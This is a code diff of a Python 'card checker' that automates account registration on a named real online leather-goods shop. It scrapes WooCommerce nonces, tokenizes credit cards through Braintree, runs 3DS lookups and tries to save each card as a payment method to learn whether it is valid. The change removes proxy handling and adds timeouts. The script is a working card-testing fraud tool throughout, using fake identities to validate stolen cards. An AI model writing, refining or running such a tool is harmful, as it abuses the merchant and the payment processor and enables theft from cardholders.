@@ -19,31 +19,13 @@ def generate_phone():
     fake.add_provider(IndiaPhoneNumberProvider)
     return fake.india_phone_number()
 
-def check_card(card, proxy):
+def check_card(card, proxy=None):
     try:
         correlationid = secrets.token_hex(16)
         r = requests.session()
         
-        # Setup proxy - handle format: host:port:user:pass
+        # No proxy - direct connection for faster and more reliable checks
         proxies = None
-        if proxy:
-            parts = proxy.split(':')
-            if len(parts) >= 2:
-                host = parts[0]
-                port = parts[1]
-                if len(parts) >= 4:
-                    # Format: host:port:user:pass
-                    user = parts[2]
-                    pwd = ':'.join(parts[3:])  # Join remaining parts as password may contain :
-                    proxy_url = f'http://{user}:{pwd}@{host}:{port}'
-                else:
-                    # Format: host:port
-                    proxy_url = f'http://{host}:{port}'
-                
-                proxies = {
-                    'http': proxy_url,
-                    'https': proxy_url
-                }
         
         phone = generate_phone()
         fake = Faker()
@@ -96,7 +78,7 @@ def check_card(card, proxy):
             'sec-fetch-dest': "document",
         }
         
-        response = r.get(url, headers=headers, proxies=proxies, timeout=30)
+        response = r.get(url, headers=headers, timeout=30)
         
         # Parse register nonce
         if 'woocommerce-register-nonce" value=' not in response.text:
@@ -116,11 +98,11 @@ def check_card(card, proxy):
             'register': "Register"
         }
         
-        response = r.post(url, data=payload, headers=headers, proxies=proxies, timeout=30)
+        response = r.post(url, data=payload, headers=headers, timeout=30)
         
         # Step 3: Get billing nonce
         url = "https://www.fantinipelletteria.com/my-account/edit-address/billing/"
-        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, timeout=30)
+        response = r.get(url, headers=headers, cookies=r.cookies, timeout=30)
         
         if 'name="woocommerce-edit-address-nonce" value=' not in response.text:
             return {'status': 'error', 'message': 'Failed to get billing nonce - session may have expired', 'card': card}
@@ -148,11 +130,11 @@ def check_card(card, proxy):
             'action': "edit_address"
         }
         
-        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, proxies=proxies, timeout=30)
+        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, timeout=30)
         
         # Step 5: Get payment nonce and Braintree token
         url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
-        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, timeout=30)
+        response = r.get(url, headers=headers, cookies=r.cookies, timeout=30)
         
         try:
             nonce = response.text.split('name="woocommerce-add-payment-method-nonce" value="')[1].split('"')[0]
@@ -191,7 +173,7 @@ def check_card(card, proxy):
             'accept-language': "en-US,en;q=0.9,ar;q=0.8"
         }
         
-        response = requests.post(url, data=json.dumps(payload), headers=headers, proxies=proxies)
+        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
         googleauth = response.text.split('"cardinalAuthenticationJWT":')[1].split('"')[1]
         clb = response.text.split('"braintreeClientId":')[1].split('"')[1]
         clid = response.text.split('"clientId":')[1].split('"')[1]
@@ -241,7 +223,7 @@ def check_card(card, proxy):
             'accept-language': "en-US,en;q=0.9,ar;q=0.8"
         }
         
-        response = r.post(url, data=json.dumps(payload), headers=headers, proxies=proxies)
+        response = r.post(url, data=json.dumps(payload), headers=headers, timeout=30)
         tok = response.json()['data']['tokenizeCreditCard']['token']
         
         # Step 8: 3DS lookup
@@ -305,7 +287,7 @@ def check_card(card, proxy):
             'accept-language': "en-US,en;q=0.9,ar;q=0.8"
         }
         
-        response = r.post(url, data=json.dumps(payload), headers=headers, proxies=proxies)
+        response = r.post(url, data=json.dumps(payload), headers=headers, timeout=30)
         noncecc = response.json()['paymentMethod']['nonce']
         
         # Step 9: Add payment method
@@ -338,7 +320,7 @@ def check_card(card, proxy):
             'sec-fetch-dest': "document",
         }
         
-        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, proxies=proxies)
+        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, timeout=30)
         
         try:
             msg = response.text.split('There was an error saving your payment method. Reason:')[1].split('<')[0] + " ❌"
